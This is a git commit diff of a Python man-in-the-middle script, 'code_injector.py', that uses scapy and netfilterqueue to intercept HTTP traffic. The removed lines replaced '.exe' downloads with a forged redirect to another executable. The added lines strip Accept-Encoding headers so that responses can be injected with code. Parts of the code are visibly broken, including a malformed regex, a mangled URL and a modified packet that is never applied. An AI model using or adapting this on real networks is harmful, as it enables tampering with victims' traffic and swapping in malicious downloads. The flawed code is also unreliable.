85a0d3117f3b66c309d230d39425b42f8283fec9
TVS <thoppays@gmail.com>
2019-01-29 21:50:08 -0500

    Updated existing and added new scripts.

--- code_injector.py
+++ code_injector.py
@@ -13,6 +13,7 @@
 
 import netfilterqueue
 import scapy.all as scapy
+import re
 
 ack_list =[]
 
@@ -27,20 +28,14 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport ==80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] exe Request")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
-            # print("HTTP Request")
-            # print(scapy_packet.show())
+            print("[+] Request")
+            modified_load = re.sub("Accept-Encoding:,*?\\r\\n", '', scapy_packet[scapy.Raw].load)
+            new_packet = set_load(scapy_packet, modified_load)
+
+            print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www/rarlab.com/rar/wrar56b1.exe\n\n")
-                modified_packet.set_payload(str(scapy.packet))
-            # print("HTTP Response")
-            # print(scapy_packet.show())
+            print("[+] Response")
+            print(scapy_packet.show())
 
     packet.accept()
 
